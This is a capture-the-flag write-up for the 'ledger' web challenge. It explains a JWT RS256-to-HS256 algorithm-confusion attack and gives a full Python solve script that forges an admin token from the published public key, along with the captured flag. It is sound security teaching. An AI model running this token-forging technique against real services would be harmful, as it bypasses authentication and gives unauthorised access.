---
title: ledger
ctf: CryoVault Finals
date: 2026-10-24
category: web
difficulty: hard
points: 500
flag_format: isfcr{...}
author: ""
---

# ledger

## Summary

A Flask "ledger gate" issues RS256-signed session tokens, publishes its public key at `/pubkey`, and gates `GET /flag` on `role: admin`. The verifier accepts both RS256 and HS256 but feeds the *same* key material — the PEM text as loaded from disk — into either verifier, so the public key could be reused as an HMAC secret to forge an admin token.

## Solution

1. **Fingerprint the token.** `POST /login {"user":"guest"}` returns a JWT with header `{"alg":"RS256","typ":"JWT"}` and payload `{"user":"guest","role":"guest"}`. `GET /pubkey` hands back the PEM SubjectPublicKeyInfo with a trailing newline.
2. **Confirm HS256 is accepted.** Re-signing the same claims as HS256 with a bogus key produced `{"error":"invalid token: InvalidSignature"}` rather than an algorithm rejection — the verifier is happy to run an HMAC check and only the secret was wrong. (HS384/HS512 and `alg:none` return `ValueError`, so the algorithm list is exactly `["RS256","HS256"]`.)
3. **Confuse the key.** The verifier uses the PEM file contents verbatim as the verification key for both algorithms. Passing the public key string to an HMAC verifier is the classic RS256→HS256 confusion: sign `{"user":"admin","role":"admin"}` with HMAC-SHA256 keyed by the exact 451 bytes from `/pubkey` (trailing `\n` included; PyJWT 2.15 refuses to do this itself, so the token is hand-rolled). The forged token is accepted by `GET /flag`, which returns the seal.

Key detail that makes or breaks it: the HMAC secret is the **raw PEM text including the final newline**. Stripping whitespace, dropping the armour lines, or using the base64 body alone all fail signature verification.

## Solve script

```python
#!/usr/bin/env python3
"""
CryoVault Finals - "ledger" (Web, 500 pts)

RS256 -> HS256 algorithm-confusion attack.

The service signs session tokens with RS256 and publishes its public key at
GET /pubkey.  The verifier, however, accepts both RS256 and HS256 and passes
the *same* key material (the PEM text loaded from disk, trailing newline
included) to the verifier regardless of the algorithm named in the header.

So we can take the public PEM, switch the header to HS256 and use the PEM
bytes themselves as the HMAC secret.  Any token we sign that way verifies,
which lets us set role=admin and read GET /flag.

Run:  python solve.py
Deps: requests
"""
import base64
import hashlib
import hmac
import json
import sys

import requests

BASE = "https://isfcrpesu-ledger.chals.io"


def b64url(data: bytes) -> str:
    """Unpadded base64url, as JWT requires."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def mint_hs256(header: dict, payload: dict, secret: bytes) -> str:
    """Hand-rolled HS256 JWT (PyJWT refuses to HMAC an asymmetric PEM key)."""
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def main() -> str:
    s = requests.Session()

    # 1. Recover the service signing key (public half) exactly as served.
    pem = s.get(f"{BASE}/pubkey", timeout=15).text
    print(f"[*] fetched public key ({len(pem)} bytes)")

    # 2. Grab a normal token so we know the real claims shape.
    tok = s.post(f"{BASE}/login", json={"user": "guest"}, timeout=15).json()["token"]
    payload = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
    print(f"[*] baseline claims: {payload}")

    # 3. Algorithm confusion: sign HS256 with the PEM text as the HMAC secret.
    payload["user"] = "admin"
    payload["role"] = "admin"
    forged = mint_hs256({"alg": "HS256", "typ": "JWT"}, payload, pem.encode())
    print(f"[*] forged token: {forged[:60]}...")

    # 4. Spend the admin token on the sealed ledger.
    r = s.get(f"{BASE}/flag", headers={"Authorization": f"Bearer {forged}"}, timeout=15)
    print(f"[*] GET /flag -> {r.status_code} {r.text}")
    r.raise_for_status()

    flag = r.json()["flag"]
    assert flag.startswith("isfcr{") and flag.endswith("}"), f"bad flag: {flag!r}"
    print(f"\n[+] FLAG: {flag}")
    return flag


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001 - surface the real failure
        print(f"[-] failed: {exc}", file=sys.stderr)
        sys.exit(1)
```

## Flag

```
isfcr{jwt_rs256_hs256_c0nfus10n_l3dg3r_7a2b}
```
